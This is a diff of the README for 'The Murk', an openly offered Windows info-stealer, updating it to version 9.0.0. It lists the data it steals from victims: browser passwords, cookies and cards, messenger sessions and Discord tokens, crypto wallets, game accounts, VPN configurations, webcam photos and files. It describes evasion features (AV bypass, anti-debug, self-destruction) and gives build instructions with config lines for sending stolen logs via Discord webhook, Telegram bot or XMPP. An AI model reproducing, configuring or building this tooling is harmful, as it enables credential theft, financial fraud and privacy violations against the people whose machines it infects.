@@ -4,7 +4,7 @@
 <img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
 <img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/The%20Murk-v8.2.5-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/The%20Murk-v9.0.0-blue?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">
 
 
@@ -26,38 +26,64 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 ---
 ### ❕❕Data grubed❕❕
 * ✅System info
-    * ⌚Time
-    * 💻OS
-    * 💻HWID
+    * ❗Main
+      * ⏲Time
+      * ⌚Timezone
+      * 🏙City
+      * 🏙Region
+      * 🗺Country
+      * 👤Username
+      * 🖥PC Name
+      * 💻OS
+      * 💻OS Version
+      * ⚙Architecture
+      * 🔧HWID
+      * 🔧MAC
+      * 🛠BIOS Serial Number
+      * 🛠Machine GUID
+      * 🛠BaseBoard Manufacturer
+    * 🌐Network
+        * 📡External IP
+        * 📡Internal IP
+        * 🌍Coordinates
+        * 🏬Organization
+        * 📯Postal
     * 🔩CPU
+        * 📜CPU model
         * 📜Cores
         * 📜CPU frequency
-    * 📡IP
-    * 📡Location
+    * 🎥GPU
+        * 🔩GPU model
+        * 💾All memory in the GPU
+        * 💾Free memory in the GPU
+        * 💾Used memory in the GPU
+        * 📜GPU temperature
     * 💽RAM
+        * 💾All RAM
         * 💾Available
         * 💾Used
-    * 📜PC name
-    * 💽Discs
+    * 💽DRIVES
         * 📜volumes
         * 💾All Memory
         * 💾Available
         * 💾Used
         * 📜File system type
-    * 🧪Antiviruses
-    * 🎥GPU
-        * 🔩Type
-        * 💾All memory in the GPU
-        * 💾Free memory in the GPU
-        * 📜Graphics card temperature
-    * 📠Processes
-* ✅Files .txt and .docx
+    * 🧮OTHER 
+      * 🧪Antiviruses
+      * 📠Processes
+      * 📄Clipboard
+      * 📱Programs
+      * 🔑Product key
+      * 📡Wifi
+      * 🗂FileZilla
+* ✅Files .txt, .docx, etc
     * 📝in Desktop
     * 📝in Documents
     * 📝in Downloads
 * 🪁Messagers
    * 📢Telegram sessions
    * 📢Viber sessions
+   * 📢Pidgin sessions
    * 📢Discord sessions + token-grabber + pwd-grabber
    * 📢Skype sessions
    * 📢WhatsApp sessions
@@ -68,6 +94,7 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
    * ♠Uplay
    * ♠Roblox
    * ♠Minecraft
+   * ♠BattleNET
    * ♠And more
 * 💳Wallets
    * 💵PayPal
@@ -76,43 +103,54 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
    * 📈Metamask
    * 📈Atomic
    * 💵And more
-* ✅Browsers
+* 🌐Browsers
     * 🔗Chrome
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
         * 📥Downloads
+        * 🧩Extensions
         * 💳Cards
     * 🔗Firefox
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
         * 📥Downloads
+        * 🧩Extensions
         * 💳Cards
     * 🔗Opera
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
         * 📥Downloads
+        * 🧩Extensions
         * 💳Cards
     * 🔗Edge
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
         * 📥Downloads
+        * 🧩Extensions
         * 💳Cards
     * 🔗Brave
         * 🔑Passwords
         * 🔐Cookies
         * 📝History
         * 📥Downloads
+        * 🧩Extensions
         * 💳Cards
     * 🔗And more
-* ✅Other
+* 📡VPN
+    * ⛓Nord VPN 
+    * ⛓Open VPN
+    * ⛓Proton VPN
+* 📚Other
     * 📸Sreenshot
     * 📸Camera photo
-* ✅File grabber
-* ✅Secure to use
+    * 🗃File grabber
+    * 🛡Anti-debug
+    * 💉AV bypass
+    * 🎭Self destruction
 ---
 ### 🔨Building(using builder)
 
@@ -131,12 +169,13 @@ Insert this data in builder console. Better use building using pyarmor. And wait
 ### 🔨Building(manually)
 
 ### 🎮For Discord
-Finally, insert the name and webhook link in the `TheMurk.py` here
+Finally, insert the name and webhook link in the `config\config.py` here
 ```
-enableFileGrubber = False #enable file grabber
+enableFileGrabber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
-avKiller = False #enable antiviruses killer
-debuging = False #disable AntiDebug
+avbypass = False #enable antiviruses bypass
+selfDestruct = False #deletes itself after stealing
+debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
 
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 discordData = ["url of your WebHook","name of that WebHook"]
@@ -144,12 +183,13 @@ discordData = ["url of your WebHook","name of that WebHook"]
 and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ### 📨For Telegram
-Finally, insert the name and webhook link in the `TheMurk.py` here
+Finally, insert the name and webhook link in the `config\config.py` here
 ```
-enableFileGrubber = False #enable file grabber
+enableFileGrabber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
-avKiller = False #enable antiviruses killer
-debuging = False #disable AntiDebug
+avbypass = False #enable antiviruses bypass
+selfDestruct = False #deletes itself after stealing
+debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
 
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
@@ -157,12 +197,13 @@ TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
 and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ### 📡For XMPP
-Finally, insert the name and webhook link in the `TheMurk.py` here
+Finally, insert the name and webhook link in the `config\config.py` here
 ```
-enableFileGrubber = False #enable file grabber
+enableFileGrabber = False #enable file grabber
 oneStart = False #enable this if you want logs to come only from unique computers
-avKiller = False #enable antiviruses killer
-debuging = False #disable AntiDebug
+avbypass = False #enable antiviruses bypass
+selfDestruct = False #deletes itself after stealing
+debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
 
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 xmppData = ["jabberid","jabberpassword","jabberreceiver"]
